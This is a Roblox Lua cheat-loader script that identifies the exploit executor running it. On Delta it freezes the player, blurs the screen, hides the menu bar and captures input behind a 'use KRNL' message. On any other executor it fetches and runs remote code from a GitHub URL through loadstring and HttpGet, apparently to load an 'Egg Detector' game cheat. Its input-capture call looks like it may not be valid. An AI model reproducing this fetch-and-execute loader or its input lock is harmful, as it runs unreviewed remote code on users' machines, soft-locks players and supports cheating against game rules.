-- 🔍 Delta Executor Detection + Freeze Lock by Drei

local Players = game:GetService("Players")
local Lighting = game:GetService("Lighting")
local UserInputService = game:GetService("UserInputService")
local StarterGui = game:GetService("StarterGui")
local player = Players.LocalPlayer
local camera = workspace.CurrentCamera
local gui = player:WaitForChild("PlayerGui")

-- Function to detect executor
local function getExecutorName()
	if identifyexecutor then
		return identifyexecutor()
	elseif getexecutorname then
		return getexecutorname()
	elseif isdelta then
		return "Delta"
	elseif iskrnlclosure then
		return "Krnl"
	elseif syn then
		return "Synapse X"
	elseif is_sirhurt_closure then
		return "SirHurt"
	elseif pebc_execute then
		return "ProtoSmasher"
	elseif isfluxus then
		return "Fluxus"
	else
		return "Unknown"
	end
end

local executor = getExecutorName()
warn("Executor Detected:", executor)

-- If executor is Delta, activate the freeze screen
if executor:lower():find("delta") then
	-- Wait for character
	local character = player.Character or player.CharacterAdded:Wait()
	local humanoid = character:WaitForChild("Humanoid")
	local rootPart = character:WaitForChild("HumanoidRootPart")

	-- 🌀 Blur screen
	local blur = Instance.new("BlurEffect")
	blur.Name = "DeltaFreezeBlur"
	blur.Size = 25
	blur.Parent = Lighting

	-- 🧊 Freeze player
	humanoid.WalkSpeed = 0
	humanoid.JumpPower = 0
	humanoid.AutoRotate = false
	rootPart.Anchored = true

	-- 🎥 Lock camera
	camera.CameraType = Enum.CameraType.Scriptable
	camera.CFrame = CFrame.new(rootPart.Position + Vector3.new(0, 6, 12), rootPart.Position)

	-- 🖥️ Minimalist prompt UI
	local screenGui = Instance.new("ScreenGui")
	screenGui.Name = "DeltaWarningPrompt"
	screenGui.ResetOnSpawn = false
	screenGui.IgnoreGuiInset = true
	screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
	screenGui.Parent = gui

	local frame = Instance.new("Frame")
	frame.Size = UDim2.new(0, 460, 0, 180)
	frame.Position = UDim2.new(0.5, 0, 0.5, 0)
	frame.AnchorPoint = Vector2.new(0.5, 0.5)
	frame.BackgroundColor3 = Color3.fromRGB(245, 245, 245)
	frame.BorderSizePixel = 0
	frame.Parent = screenGui

	local corner = Instance.new("UICorner")
	corner.CornerRadius = UDim.new(0, 14)
	corner.Parent = frame

	local label = Instance.new("TextLabel")
	label.Size = UDim2.new(1, -40, 1, -40)
	label.Position = UDim2.new(0, 20, 0, 20)
	label.BackgroundTransparency = 1
	label.TextWrapped = true
	label.TextScaled = true
	label.Font = Enum.Font.Gotham
	label.TextColor3 = Color3.fromRGB(30, 30, 30)
	label.Text = "⚠️ This script is not stable on Delta.\n\nPlease use KRNL to run it properly."
	label.Parent = frame

	-- 🔧 Hide TopBar (ESC/menu)
	pcall(function()
		StarterGui:SetCore("TopbarEnabled", false)
	end)

	-- ⛔ Block input backup
	UserInputService.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.Keyboard or input.UserInputType == Enum.UserInputType.Gamepad1 then
			input:CaptureController()
		end
	end)
else
	-- ✅ Not Delta → continue loading Egg Detector script
	loadstring(game:HttpGet("https://raw.githubusercontent.com/grow-a-garden-ctrl/EggDetector/refs/heads/main/main.lua"))()
end
